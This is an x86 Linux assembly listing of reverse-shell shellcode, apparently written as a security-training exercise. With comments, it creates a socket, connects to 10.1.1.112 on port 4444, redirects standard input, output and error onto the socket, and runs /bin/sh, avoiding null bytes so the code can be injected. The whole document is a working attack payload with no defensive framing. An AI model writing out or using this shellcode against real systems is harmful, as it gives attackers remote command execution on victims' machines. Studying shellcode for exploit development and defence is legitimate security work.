global _start
section .text
_start:
    xor eax, eax        ; zero out registers to avoid nulls later
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
; Create socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    mov ax, 0x167       ; socket syscall number
    mov bl, 0x2         ; 2 is for AF_INET
    mov cl, 0x1         ; 1 is for SOCK_STREAM type
                        ; edx is already 0 for IPPROTO_IP
    int 0x80
; Implement connect syscall
    xchg ebx, eax       ; put sockfd in first argument for connect
    xor eax, eax
    mov ax, 0x16a       ; connect syscall number
    mov ebp, esp        ; stack frame
    push dword edx      ; push 4 bytes null padding
    push dword edx      ; push 4 bytes null padding
    push 0x7001010a     ; push 10.1.1.112
    push word 0x5c11    ; push port 4444 (reverse hex)
    push word 0x2       ; push  AF_INET
    mov ecx, esp        ; ecx -> address structure
    sub ebp, esp        ; calculate size of address structure
    mov edx, ebp        ; move size into edx
    int 0x80            ; run connect syscall
; implement dup2 syscalls
    xor ecx, ecx
    xor edx, edx
    mov cl, 0x3         ; number of loops/duplicates
_dupfds:
    xor eax, eax
    mov al, 0x3f        ; dup2 syscall number
    dec ecx
    int 0x80
    jnz _dupfds         ; loop three times, cont. when ZF set
; implement execve to execute /bin/sh
_execve:
    push edx            ; put nulls on the stack
    push 0x68732f2f
    push 0x6e69622f     ; push /bin//sh to stack
    mov ebx, esp        ; pointer to null terminated file
    push edx
    mov edx, esp        ; pointer to null array for envp
    push ebx
    mov ecx, esp        ; pointer to argv
    xor eax, eax
    mov al, 0xb         ; system call number for execve
    int 0x80
